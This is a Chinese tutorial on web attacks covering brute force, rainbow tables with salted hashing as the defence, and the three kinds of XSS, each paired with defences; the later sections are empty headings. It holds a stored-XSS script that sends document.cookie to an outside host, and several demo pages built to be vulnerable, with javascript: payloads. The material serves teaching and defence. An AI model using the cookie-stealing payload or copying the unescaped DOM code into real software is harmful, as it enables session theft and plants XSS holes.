# 常见的web页面网络攻击
---
---
## 1. 暴力破解
### 1.1 暴力破解密码

【**攻击原理**】暴力破解一般不是在web页面，但是对于公有云的虚拟机，只要拿到了IP地址，用ssh进行登陆的话，就有可能通过暴力破解完成登陆。一般暴力破解不会简单的遍历，而会用到两个东西：

- 弱密码库（弱密码字典）
- 社工库

【**防御**】杜绝弱密码，密码需要包含：大小写字母，数字，特殊符号，12位以上，且不包含生日、1234、年份、车牌等信息。

### 1.2 彩虹表攻击
【**攻击原理**】[彩虹表](https://blog.csdn.net/whatday/article/details/88527936/)攻击是不同于暴力破解的盲扫，彩虹表攻击已经知道其密码的hash值。我们在把密码存到数据库的时候往往不是明文存储的，而是存储它的hash值。在我们拿到hash值之后并不能反解出来它的密码明文，**因此我们需要构建弱密码的hash存放在彩虹表里，实际上是通过一个R函数，生成==hash: password对==。通过hash值找到对应的密码明文**。

彩虹表的关键是构造R函数，优秀的R函数要保证计算结果均匀分布，即避免出现相同的明文密码。然而想构造优秀的R函数是件非常困难的事，不同的哈希链中可能会出现大量的重复数据，严重影响了密码攻击的效率。

【**防御**】**最有效的方法就是“加盐”，即在密码的特定位置插入特定的字符串，这个特定字符串就是“盐”，加盐后的密码经过哈希加密得到的哈希串与加盐前的哈希串完全不同**，黑客用彩虹表得到的密码根本就不是真正的密码。即使黑客知道了“盐”的内容、加盐的位置，还需要对加密函数H和关系函数R进行修改，彩虹表也需要重新生成，因此加盐能大大增加利用彩虹表攻击的难度。

【**代码实现**】
加盐，是不能直接把明文密码存入数据库，需要把明文密码进行加密存储，加密存储的方式主要有：
- **明文转码加密**：BASE64, 7BIT等，这种方式只是个障眼法，不是真正的加密。
- **对称算法加密**：DES, RSA等。
- **签名算法加密**：也可以理解为单向哈希加密，比如MD5, SHA1等。加密算法固定，容
- **易被暴力破解**。如果密码相同，得到的哈希值是一样的。
- **加盐哈希加密**：加密时混入一段“随机”字符串（盐值）再进行哈希加密。即使密码相同，如果盐值不同，那么哈希值也是不一样的。**现在网站开发中主要是运用这种加密方法。**
- **密码生成函数**：generate_password_hash

python的flask是基于werkzeug工具包实现的一个web框架，可以直接使用generate_password_hash方法生成密码。看返回的代码内容，实际是由三部分构成，用“$”隔开：
- actual_method：实际的hash方法，默认是==pbkdf2:sha256==
- salt：盐值
- h：返回的密码+盐的hash值
```python
from werkzeug.security import generate_password_hash, check_password_hash
pwd_hash = generate_password_hash(password='admin1234')
is_right_pwd = check_password_hash(pwd_hash, password='admin1234')  # True/False
```
返回结果示例：
```linux
sha256$rjuuzI524d$aebdd3680a4543fdee10092b9f7b92b33094a8ffe6234a41f73c15f78558552a
```

## 2. 跨站攻击
跨站攻击说白了就是，可以通过某些手段获取本不应该获取到的网站资源，比如：
- 未登录就能够获取到，只有登陆后才应该能够获取到的内容
- 登陆之后能够获取到非当前用户可以获取到的资源
- 能够获取到非用户态能够获取到的资源

### 2.1 XSS
[本文转载链接：https://www.cnblogs.com/tugenhua0707/p/10909284.html](https://www.cnblogs.com/tugenhua0707/p/10909284.html)
[githubXSS示例代码：https://github.com/tugenhua0707/web-security](https://github.com/tugenhua0707/web-security/tree/master/xss/%E5%8F%8D%E5%B0%84%E6%80%A7xss)
#### 2.1.1 反射型的xss攻击
【**攻击原理**】反射性XSS的原理是：反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行

反射性XSS又可以叫做**非持久性XSS**。为什么叫反射型XSS呢？那是因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的，而为什么又叫非持久性XSS呢？那是因为这种攻击方式只有一次性。

比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当**受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 "反射"到受害者的浏览器上，从而浏览器就执行了该脚本**。

因此反射型XSS的攻击步骤如下：

1. 攻击者在url后面的参数中加入恶意攻击代码。
2. 当用户打开带有恶意代码的URL的时候，网站**服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端**。
3. 用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。
4. 攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户的行为，调用目标网站接口执行攻击等操作。

【**防御**】反射的XSS相对来说只能由用户来进行规避，不要点击陌生邮件的任何链接。XSS漏洞来自缺乏数据转发，在应用程序中防御反射XSS的唯一能做的只能是，当在模板引擎级别使用用户输入时，应执行转义。这是开发人员唯一点在上下文中可以知道用户数据。


#### 2.1.2 存储型XSS
【**攻击原理**】存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。

比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：
```html
<script>window.open("www.lichangan.com?param="+document.cookie)</script>
```
如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。

因此存储型XSS的攻击步骤如下：

1. 攻击者将恶意代码提交到目标网站数据库中。
2. 用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。
3. 用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。
4. 那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该
cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。

【**防御**】
1. 后端需要对提交的数据进行过滤。
2. 前端也可以做一下处理方式，比如对script标签，将特殊字符替换成HTML编码这些等。

#### 2.1.3 DOM-based型XSS
【**攻击原理**】我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。比如说客户端从URL中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。因此DOM型XSS的攻击步骤如下：

1. 攻击者构造出特殊的URL、在其中可能包含恶意代码。
2. 用户打开带有恶意代码的URL。
3. 用户浏览器收到响应后解析执行。前端使用js取出url中的恶意代码并执行。
4. 执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口
执行攻击者一些操作。

DOM XSS 是基于文档对象模型的XSS。一般有如下DOM操作：
1. 使用document.write直接输出数据。
2. 使用innerHTML直接输出数据。
3. 使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。
比如如下demo:
```html
<script>
  document.body.innerHTML = "<a href='"+url+"'>"+url+"</a>";
</script>
```
假如对于变量url的值是：==javascript:alert('dom-xss');== 类似这样的，那么就会收到xss的攻击了。因此**对于DOM XSS主要是由于本地客户端获取的DOM数据在本地执行导致的**。因此我们需要对HTML进行编码，对JS进行编码来防止这些问题产生。

DOM XSS攻击的demo代码：
1.  使用document.write直接输出导致浏览器解析恶意代码
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset=utf-8>
  <meta name="referrer" content="never">
  <title></title>
</head>
<body>
  <script type="text/javascript">
    var s = location.search;            // 返回URL中的查询部分（？之后的内容）
    // 为了方便演示，我们假如url是 如下这样的
    // http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); 
    // 然后我们的是 s 的值就为如下：
    s = "?url=javascript:alert('xsstest')";
    s = s.substring(1, s.length);       // 返回整个查询内容
    var url = "";                       // 定义变量url
    if (s.indexOf("url=") > -1) {       // 判断URL是否为空 
      var pos = s.indexOf("url=") + 4;  // 过滤掉"url="字符
      url = s.substring(pos, s.length);  // 得到地址栏里的url参数
    } else {
      url = "url参数为空";
    }
    document.write('url: <a href="' + url + '">"' + url + '"</a>'); 
  </script>
</body>
</html>
```

2. 使用innerHTML直接输出导致浏览器解析恶意代码
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset=utf-8>
  <meta name="referrer" content="never">
  <title></title>
</head>
<body>
  <script type="text/javascript">
    var s = location.search;            // 返回URL中的查询部分（？之后的内容）
    // 为了方便演示，我们假如url是 如下这样的
    // http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); 
    // 然后我们的是 s 的值就为如下：
    s = "?url=javascript:alert('xsstest')";
    s = s.substring(1, s.length);       // 返回整个查询内容
    var url = "";                       // 定义变量url
    if (s.indexOf("url=") > -1) {       // 判断URL是否为空 
      var pos = s.indexOf("url=") + 4;  // 过滤掉"url="字符
      url = s.substring(pos, s.length);  // 得到地址栏里的url参数
    } else {
      url = "url参数为空";
    }
  </script>
  <div id='test'><a href=""></a></div>
  <script type="text/javascript">
      document.getElementById("test").innerHTML = '我的url是: <a href="' + url + '">"' + url + '"</a>';
  </script>
</body>
</html>
```

3. 使用location/location.href/location.replace/iframe.src 造成的XSS
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset=utf-8>
  <meta name="referrer" content="never">
  <title></title>
</head>
<body>
  <script type="text/javascript">
    var s = location.search;            // 返回URL中的查询部分（？之后的内容）
    // 为了方便演示，我们假如url是 如下这样的
    // http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); 
    // 然后我们的是 s 的值就为如下：
    s = "?url=javascript:alert('xsstest')";
    s = s.substring(1, s.length);       // 返回整个查询内容
    var url = "";                       // 定义变量url
    if (s.indexOf("url=") > -1) {       // 判断URL是否为空 
      var pos = s.indexOf("url=") + 4;  // 过滤掉"url="字符
      url = s.substring(pos, s.length);  // 得到地址栏里的url参数
    } else {
      url = "url参数为空";
    }
  </script>
  <div id='test'><a href=""></a></div>
  <script type="text/javascript">
    location.href = url;
  </script>
</body>
</html>
```

### 2.2 伪装请求的csrf
### 2.3 伪装session的csrf
## 3. DOS攻击
### 3.1 cc攻击
### 3.2 DDOS攻击
### 3.3 SYN泛洪攻击
### 3.4 DNS泛洪攻击
## 4. 注入攻击
### 4.1 SQL注入
### 4.2 PHP注入
### 4.3 shell注入
### 4.4 文件上传漏洞
## 5. 网络劫持攻击
### 5.1 中间人攻击
### 5.2 DNS污染

### 5.3 域名劫持